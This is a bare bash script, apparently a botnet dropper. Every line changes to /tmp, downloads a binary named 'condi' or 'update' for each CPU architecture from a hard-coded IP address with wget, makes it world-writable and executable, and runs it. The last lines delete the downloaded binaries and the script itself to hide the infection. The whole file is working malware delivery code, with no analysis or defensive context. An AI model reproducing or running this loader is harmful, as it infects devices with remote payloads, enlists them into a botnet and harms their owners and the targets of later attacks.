#!/bin/bash
cd /tmp; wget http://45.147.46.125/binaries/condi.x86; chmod 777 condi.x86; ./condi.x86 x86
cd /tmp; wget http://45.147.46.125/binaries/condi.x86_64; chmod 777 condi.x86_64; ./condi.x86_64 x86_64
cd /tmp; wget http://45.147.46.125/binaries/condi.mips; chmod 777 condi.mips; ./condi.mips mips
cd /tmp; wget http://45.147.46.125/binaries/condi.mpsl; chmod 777 condi.mpsl; ./condi.mpsl mipsel
cd /tmp; wget http://45.147.46.125/binaries/condi.arm5; chmod 777 condi.arm5; ./condi.arm5 arm5
cd /tmp; wget http://45.147.46.125/binaries/condi.arm4; chmod 777 condi.arm4; ./condi.arm4 arm4
cd /tmp; wget http://45.147.46.125/binaries/condi.arm7; chmod 777 condi.arm7; ./condi.arm7 arm7

cd /tmp; wget http://45.147.46.125/binaries/update/update.x86; chmod 777 update.x86; ./update.x86 update.x86
cd /tmp; wget http://45.147.46.125/binaries/update/update.x86_64; chmod 777 update.x86_64; ./update.x86_64 update.x86_64
cd /tmp; wget http://45.147.46.125/binaries/update/update.mips; chmod 777 update.mips; ./update.mips update.mips
cd /tmp; wget http://45.147.46.125/binaries/update/update.mpsl; chmod 777 update.mpsl; ./update.mpsl update.mipsel
cd /tmp; wget http://45.147.46.125/binaries/update/update.arm5; chmod 777 update.arm5; ./update.arm5 update.arm5
cd /tmp; wget http://45.147.46.125/binaries/update/update.arm4; chmod 777 update.arm4; ./update.arm4 update.arm4
cd /tmp; wget http://45.147.46.125/binaries/update/update.arm7; chmod 777 update.arm7; ./update.arm7 update.arm7

rm -rf condi.*
rm -rf update.*
rm -rf a.sh